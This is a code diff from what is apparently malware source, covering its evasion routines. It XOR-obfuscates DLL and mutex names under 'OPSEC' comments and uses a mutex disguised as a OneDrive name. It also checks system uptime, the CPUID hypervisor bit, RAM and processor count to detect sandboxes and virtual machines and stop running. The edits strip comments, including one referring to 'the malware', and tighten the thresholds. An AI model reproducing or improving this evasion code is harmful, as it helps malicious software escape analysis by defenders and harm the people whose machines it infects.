@@ -27,7 +27,7 @@ bool check_mutex() {
 
     char enc_kernel32[] = { 0x34, 0x16, 0x07, 0x1e, 0x56, 0x1f, 0x00, 0x51, 0x5c, 0x57, 0x18, 0x07, 0x33 };
     
-    // current name: "Global\\OneDriveSyncMutex" (use /tools/string_encryptor.py to modify)
+    // string: "Global\\OneDriveSyncMutex"
     char enc_mutex[] = { 0x18, 0x1f, 0x1a, 0x12, 0x52, 0x1f, 0x6f, 0x2c, 0x1c, 0x56, 0x30, 0x19, 0x5a, 0x0f, 0x3a, 0x0c, 0x0a, 0x1b, 0x13, 0x7e, 0x06, 0x47, 0x06, 0x0a, 0x33 };
 
     // API hashes
@@ -37,7 +37,6 @@ bool check_mutex() {
     // kernel32.dll
     xor_crypt(enc_kernel32, sizeof(enc_kernel32), cypher_key, cypher_key_len);
     HMODULE hKernel32 = LoadLibraryA(enc_kernel32);
-    // OPSEC: recypher DLL name immediately
     xor_crypt(enc_kernel32, sizeof(enc_kernel32), cypher_key, cypher_key_len);
 
     if (!hKernel32) return false;
@@ -48,23 +47,15 @@ bool check_mutex() {
 
     if (!fnCreateMutexA || !fnGetLastError) return false;
 
-    // decrypt mutex name
     xor_crypt(enc_mutex, sizeof(enc_mutex), cypher_key, cypher_key_len);
-    
-    // create mutex
-    HANDLE hMutex = fnCreateMutexA(NULL, FALSE, enc_mutex);
-    
-    // OPSEC: recypher immediately
+    HANDLE hMutex = fnCreateMutexA(NULL, FALSE, enc_mutex);     // create mutex
     xor_crypt(enc_mutex, sizeof(enc_mutex), cypher_key, cypher_key_len);
 
-    // check if it was already running
+    // check if already running
     if (fnGetLastError() == ERROR_ALREADY_EXISTS) {
-        // another instance is running, kill current execution
         return false;
     }
 
-    // NOTE: Do NOT close hMutex here! 
-    // we want it to remain open as long as the malware is alive.
     return true;
 }
 
@@ -116,12 +107,10 @@ bool check_uptime() {
 
     if (!fnGetTickCount64) return false;
 
-    // check system uptime
-    // NOTE: sandboxes often spin up VMs dynamically
-    // if uptime < 15 minutes (900000 ms), it's highly suspicious
+    // 900000 ms = 15 min
     ULONGLONG uptime = fnGetTickCount64();
     if (uptime < 900000) {
-        return false; // probably a sandbox
+        return false;
     }
 
     return true;
@@ -133,12 +122,12 @@ bool check_vm() {
     int cpuInfo[4] = {0};
     __cpuid(cpuInfo, 1);
 
-    // check the 31st bit of the ECX register (cpuInfo[2])
+    // check 31st bit of the ECX register
     // if the bit is 1, a hypervisor is present
     bool is_vm = (cpuInfo[2] >> 31) & 1;
 
     if (is_vm) {
-        return false; // virtual machine detected, kill execution
+        return false;
     }
 
     return true;
@@ -152,7 +141,7 @@ bool check_resources() {
     
     DWORDLONG ram_mb = memInfo.ullTotalPhys / (1024 * 1024);
     
-    if (ram_mb < 3000) { 
+    if (ram_mb < 4000) { 
         return false; 
     }
 
@@ -160,7 +149,7 @@ bool check_resources() {
     SYSTEM_INFO sysInfo;
     GetSystemInfo(&sysInfo); // Windows API to read hardware info
     
-    if (sysInfo.dwNumberOfProcessors < 2) {
+    if (sysInfo.dwNumberOfProcessors <= 2) {
         return false;
     }
 
